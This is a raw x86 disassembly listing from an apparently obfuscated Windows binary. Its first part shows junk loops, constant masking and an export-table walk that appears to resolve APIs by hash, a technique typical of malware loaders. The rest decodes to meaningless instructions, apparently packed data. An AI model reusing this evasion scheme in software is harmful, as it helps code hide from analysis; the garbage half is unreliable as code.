  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [eax+ecx*8],esp
  402e94:	xlat   BYTE PTR ds:[ebx]
  402e95:	lds    edi,FWORD PTR [esp+edi*2+0x7c]
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x38652f1b
  402ea8:	imul   ebp,DWORD PTR [eax-0x44],0x6d6c6c62
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	sbb    al,0x46
  402f43:	fldcw  WORD PTR [edx+ebp*8]
  402f46:	xchg   ecx,eax
  402f47:	jmp    0x33f7:0xb8f733df
  402f4e:	(bad)
  402f52:	mov    al,ds:0x93765a5b
  402f57:	fs sbb al,0x26
  402f5a:	hlt    
  402f5b:	or     DWORD PTR [edi-0x16659893],esi
  402f61:	in     al,0xa3
  402f63:	aam    0x21
  402f65:	sbb    BYTE PTR [edx+0x2733ff0c],dl
  402f6b:	js     0x402f11
  402f6d:	pop    edi
  402f6e:	cli    
  402f6f:	push   eax
  402f70:	inc    eax
  402f71:	vunpcklpd ymm4,ymm4,ymm2
  402f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f76:	mov    ecx,0x3b7b8fe
  402f7b:	(bad)  
  402f7d:	jl     0x402f5e
  402f7f:	ds cmp al,0xa6
  402f82:	dec    esi
  402f83:	into   
  402f84:	or     eax,0x6cd538c8
  402f89:	cs ins DWORD PTR es:[edi],dx
  402f8b:	lock jbe 0x402f5e
  402f8e:	inc    eax
  402f8f:	add    BYTE PTR ds:0xdd6a42c0,ah
  402f95:	sbb    cl,BYTE PTR [eax]
  402f97:	mov    bh,0x80
  402f99:	jge    0x30aea1ad
  402f9f:	adc    dl,BYTE PTR [esi+0x56]
  402fa2:	lods   al,BYTE PTR ds:[esi]
  402fa3:	sub    eax,0xea12f355
  402fa8:	cmp    ah,BYTE PTR [edi-0x584e9c12]
  402fae:	xor    DWORD PTR ds:[ecx+eiz*2+0x7b],0xffffff8c
  402fb4:	arpl   bx,ax
  402fb6:	adc    eax,ebp
  402fb8:	dec    ecx
  402fb9:	add    dl,0x37
  402fbc:	xchg   edi,eax
  402fbd:	or     al,0x11
  402fbf:	out    dx,al
  402fc0:	push   0xffffffae
  402fc2:	add    BYTE PTR [ecx-0x520de533],dl
  402fc8:	mov    bl,0xe3
  402fca:	mov    eax,ds:0x8e2ea31a
  402fcf:	inc    ebp
  402fd1:	fild   QWORD PTR [esi]
  402fd3:	add    BYTE PTR [edi],bh
  402fd5:	sbb    al,0xea
  402fd7:	fisubr DWORD PTR [edx]
  402fd9:	sbb    al,0xe1
  402fdb:	cld    
  402fdc:	mov    eax,ds:0x6ee7ddf1
  402fe1:	ss aas 
  402fe3:	arpl   WORD PTR [ebp+0x13],si
  402fe6:	int3   
  402fe7:	loop   0x403057
  402fe9:	pushf  
  402fea:	cmp    al,0xea
  402fec:	cmp    ecx,DWORD PTR [ebx-0x5486474c]
  402ff2:	pop    edi
  402ff3:	clc    
  402ff4:	xlat   BYTE PTR ds:[ebx]
  402ff5:	jg     0x403005
  402ff7:	inc    ebp
  402ff8:	adc    al,0x4
  402ffa:	outs   dx,BYTE PTR ds:[esi]
  402ffb:	cmp    BYTE PTR [eax-0x3f],cl
  402ffe:	push   0xabb4f953
  403003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403004:	fisubr WORD PTR [ebx-0x7]
  403007:	imul   edi,DWORD PTR [ebx],0x65
  40300a:	jg     0x402fdb
  40300c:	mov    ebp,0x4437ee79
  403011:	imul   esi,DWORD PTR [edx+0x2b],0x71
  403015:	rcr    BYTE PTR [ebx],cl
  403017:	and    DWORD PTR [eax],ebx
  403019:	dec    ecx
  40301a:	add    DWORD PTR [ecx+0xc35a049],ebp
  403020:	jns    0x403070
  403022:	iret   
  403023:	je     0x403018
  403025:	add    edi,DWORD PTR [edi+0x7b]
  403028:	iret   
  403029:	in     eax,0x14
  40302b:	popf   
  40302c:	(bad)  
  40302d:	outs   dx,BYTE PTR ds:[esi]
  40302e:	ss ret 0x4058
  403032:	daa    
  403033:	imul   ecx,DWORD PTR [edi],0x75
  403036:	sbb    edi,DWORD PTR [ebx]
  403038:	fstp   TBYTE PTR [ebp+0x5e]
  40303b:	std    
  40303c:	fdivp  st(1),st
  40303e:	std    
  40303f:	pop    edi
  403040:	mov    ds:0x9a8de476,al
  403045:	jno    0x40300e
  403047:	sub    al,0xd8
  403049:	int3   
  40304a:	sar    BYTE PTR [ecx],0xb7
  40304d:	shr    DWORD PTR [ebx],1
  40304f:	mov    edi,0xcc0577ec
  403054:	jno    0x402ffa
  403056:	or     DWORD PTR [ebp+0x5c],edi
  403059:	xchg   BYTE PTR [eax],dh
  40305b:	cmp    al,0x26
  40305d:	push   ebp
  40305e:	mov    dl,0x2b
  403060:	pop    ebx
  403061:	dec    eax
  403062:	add    BYTE PTR [ebx+0x5a7ea00e],al
  403068:	and    ecx,ebx
  40306a:	mov    al,ds:0x6a442967
  40306f:	mov    DWORD PTR [ebx],ecx
  403071:	repz fisub DWORD PTR es:[ebp-0x2607c11]
  403079:	mov    ds:0x453d7bed,al
  40307e:	pushf  
  40307f:	xchg   ebx,eax
  403080:	pop    ebx
  403081:	jbe    0x40304d
  403083:	dec    esp
  403084:	ins    BYTE PTR es:[edi],dx
  403085:	pop    ecx
  403086:	sub    bh,cl
  403088:	sbb    bl,BYTE PTR [edi]
  40308a:	fs sahf 
  40308c:	jb     0x4030ac
  40308e:	xchg   ebx,eax
  40308f:	iret   
  403090:	ins    DWORD PTR es:[edi],dx
  403091:	sub    dh,BYTE PTR [eax+0x7134b3a8]
  403097:	ins    BYTE PTR es:[edi],dx
  403098:	shl    ecx,cl
  40309a:	ins    BYTE PTR es:[edi],dx
  40309b:	inc    esp
  40309c:	sub    eax,0x3135ccf5
  4030a1:	inc    ecx
  4030a2:	aaa    
  4030a3:	pop    es
  4030a4:	add    ebp,DWORD PTR [esp+ecx*8]
  4030a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a8:	or     DWORD PTR [edx+0x3c],0xffffffe2
  4030ac:	pop    ebp
  4030ad:	xchg   ecx,eax
  4030ae:	js     0x403086
  4030b0:	jne    0x4030d2
  4030b2:	int3   
  4030b3:	bound  ebp,QWORD PTR [edi]
  4030b5:	xchg   ebp,eax
  4030b6:	lods   al,BYTE PTR ds:[esi]
  4030b7:	pop    esp
  4030b8:	xor    ah,BYTE PTR [eax]
  4030ba:	and    eax,0xb5495412
  4030bf:	mov    ah,dl
  4030c1:	mov    DWORD PTR [esi],ebx
  4030c3:	sub    al,0x3b
  4030c5:	sbb    al,0x2e
  4030c7:	jl     0x403091
  4030c9:	lds    ecx,FWORD PTR [edi]
  4030cb:	push   esp
  4030cc:	in     al,0xcb
  4030ce:	xor    eax,0x1406b03f
  4030d3:	std    
  4030d4:	ficom  DWORD PTR [edx+0x4f23adbf]
  4030da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030db:	pushf  
  4030dc:	scas   eax,DWORD PTR es:[edi]
  4030dd:	leave  
  4030de:	int3   
  4030df:	(bad)  
  4030e0:	aaa    
  4030e1:	ret    0xb7fb
  4030e4:	mov    BYTE PTR [ebx+ebp*4+0x243c7dc7],bl
  4030eb:	cmp    eax,0xea41d7b9
  4030f0:	sub    ebx,ecx
  4030f2:	push   ss
  4030f3:	jns    0x403133
  4030f5:	sbb    al,0xdb
  4030f7:	xor    bl,BYTE PTR [edi]
  4030f9:	cmp    DWORD PTR [esi+edi*8],eax
  4030fc:	in     al,dx
  4030fd:	xchg   ecx,eax
  4030fe:	and    dl,BYTE PTR ds:0xa37b4dd9
  403104:	daa    
  403105:	mov    ds:0x2fe1bfc4,eax
  40310a:	fcmovnb st,st(3)
  40310c:	jo     0x4030fe
  40310e:	mov    bl,0xfb
  403110:	jne    0x403184
  403112:	loope  0x4030e1
  403114:	icebp  
  403115:	mov    dh,0xa1
  403117:	sbb    eax,DWORD PTR [esi-0x11e540e1]
  40311d:	rep stos BYTE PTR es:[edi],al
  40311f:	das    
  403120:	aaa    
  403121:	sub    eax,0x4cd19ce5
  403126:	inc    eax
  403127:	inc    ebp
  403128:	push   ds
